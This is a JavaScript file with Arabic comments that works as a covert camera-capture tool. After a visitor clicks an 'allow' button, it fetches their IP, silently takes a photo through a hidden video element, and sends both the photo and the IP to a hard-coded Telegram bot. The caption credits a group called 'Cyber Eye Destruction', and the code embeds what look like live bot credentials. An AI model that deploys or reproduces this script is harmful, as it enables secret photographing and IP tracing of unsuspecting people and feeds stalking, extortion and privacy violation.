const botToken = "7791482853:AAGdLgDN6zpRIwcCRNVs-fvY9V0EgyiC89g"; // ضع التوكن الخاص بك هنا
const chatId = "7606838586"; // ضع الـ Chat ID الخاص بك هنا

document.getElementById("allowBtn").addEventListener("click", async () => {
    try {
        // جمع عنوان الـ IP باستخدام ipify API
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIp = ipData.ip;
        
        // طلب الوصول إلى الكاميرا ولكن دون عرض الفيديو
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // إنشاء عنصر فيديو مخفي لالتقاط الصورة فورًا
        const video = document.createElement('video');
        video.srcObject = stream;
        video.style.display = "none"; // عدم عرض الفيديو
        
        // الانتظار حتى يكون الفيديو جاهز للتقاط الصورة
        video.onloadedmetadata = () => {
            captureImage(video, userIp); // التقاط الصورة مباشرة
        };

    } catch (error) {
        console.error("تم رفض الوصول إلى الكاميرا أو الـ IP: ", error);
    }
});

document.getElementById("denyBtn").addEventListener("click", () => {
    alert("تم رفض الوصول.");
});

function captureImage(video, userIp) {
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");

    // تحديد أبعاد الصورة بناءً على الفيديو
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // تحويل الصورة إلى blob ثم إرسالها
    canvas.toBlob((blob) => sendToTelegram(blob, userIp), "image/jpeg");

    // إيقاف الكاميرا بعد التقاط الصورة
    video.srcObject.getTracks().forEach(track => track.stop());
}

async function sendToTelegram(blob, userIp) {
    console.log("محاولة إرسال الصورة إلى البوت...");

    const formData = new FormData();
    formData.append("chat_id", chatId);  // استبدل بـ Chat ID الخاص بك
    formData.append("photo", blob, "photo.jpg");
    formData.append("caption", `User IP: ${userIp}\nتم التقديم من قبل فريق Cyber Eye Destruction`); // إضافة الـ IP مع الصورة والنص

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        });

        if (response.ok) {
            console.log("تم إرسال الصورة بنجاح!");
        } else {
            const errorText = await response.text();
            console.error("حدث خطأ أثناء الإرسال:", errorText);
        }
    } catch (error) {
        console.error("حدث خطأ أثناء الإرسال:", error);
    }
}
